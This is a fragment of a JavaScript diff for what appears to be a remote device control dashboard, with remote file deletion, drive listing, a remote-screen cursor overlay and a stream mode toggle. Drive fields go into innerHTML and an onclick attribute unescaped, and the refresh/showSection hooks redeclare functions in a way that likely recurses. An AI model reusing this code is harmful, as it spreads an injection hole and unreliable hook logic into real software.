+  if (!_fileDeviceId || !SC.socket) return;
+  SC.socket.emit('file_delete', { device_id: _fileDeviceId, path });
+}
+function renderDrives(drives) {
+  const tbody = document.getElementById('ftbody'); if(!tbody) return;
+  tbody.innerHTML = drives.map(d => `<tr>
+    <td><div style="display:flex;align-items:center;gap:6px;cursor:pointer" onclick="fileNavTo('${d.drive}','dir')">
+      <span class="material-symbols-outlined" style="font-size:16px;color:var(--orange)">hard_drive</span>
+      <span style="font-size:12px;font-weight:600;color:var(--text-1)">${escHtml(d.drive)}</span>
+    </div></td>
+    <td><span style="font-size:10px;color:var(--text-3)">${d.fstype||'disk'}</span></td>
+    <td style="font-family:var(--mono);font-size:11px;color:var(--text-3)">${d.total_gb} GB total</td>
+    <td style="font-size:10px;color:var(--text-3)">${d.free_gb} GB free (${d.percent}% used)</td>
+    <td></td>
+  </tr>`).join('');
+}
+
+/* ── Cursor overlay for remote view ── */
+function drawCursorOverlay(cx, cy, clicking) {
+  const canvas = document.getElementById('rv-canvas');
+  const overlay = document.getElementById('rv-cursor-overlay');
+  if (!canvas || !overlay || canvas.style.display==='none') return;
+  overlay.width = canvas.clientWidth;
+  overlay.height = canvas.clientHeight;
+  overlay.style.width = canvas.style.width || canvas.clientWidth+'px';
+  overlay.style.height = canvas.style.height || canvas.clientHeight+'px';
+  const ctx = overlay.getContext('2d');
+  ctx.clearRect(0,0,overlay.width,overlay.height);
+  const scaleX = canvas.clientWidth / (canvas.width||1);
+  const scaleY = canvas.clientHeight / (canvas.height||1);
+  const sx = cx * scaleX, sy = cy * scaleY;
+  ctx.beginPath(); ctx.arc(sx,sy,10,0,Math.PI*2);
+  ctx.strokeStyle = '#fff'; ctx.lineWidth = 2; ctx.stroke();
+  ctx.beginPath(); ctx.arc(sx,sy,3,0,Math.PI*2);
+  ctx.fillStyle = clicking ? 'rgba(255,0,0,0.8)' : '#000'; ctx.fill();
+}
+
+/* ── Stream mode toggle ── */
+function toggleStreamMode() {
+  if (!RV.active || !SC.socket) return;
+  const newMode = (RV._streamMode||'video')==='video' ? 'screenshot' : 'video';
+  RV._streamMode = newMode;
+  const lbl = document.getElementById('rv-mode-lbl'); if(lbl) lbl.textContent = newMode==='video'?'Video':'Screen';
+  SC.socket.emit('set_stream_mode', { device_id: RV.deviceId, mode: newMode });
+  showToast('Stream mode: '+newMode, 'info');
+}
+
+/* ── Refresh hook: populate device dropdowns ── */
+const _origRefresh = refresh;
+async function refresh() {
+  await _origRefresh();
+  _populateDeviceSelects();
+}
+
+/* ── showSection hook: activate cursor overlay ── */
+const _origShowSection = showSection;
+function showSection(id) {
+  _origShowSection(id);
+  // Extra rail highlighting
+  ['system','processes'].forEach(sec => {
+    const ri = document.getElementById('rail-'+sec);
+    if (ri) ri.classList.toggle('active', id===sec);
+  });
+  // Show cursor overlay when in remote view
+  const ov = document.getElementById('rv-cursor-overlay');
+  if (ov) ov.style.display = id==='remote-view' ? 'block' : 'none';
+}
+
 document.addEventListener('DOMContentLoaded', async () => {
   document.querySelectorAll('.dash-section').forEach(s => s.style.display='none');
   // Set settings input to actual resolved URL
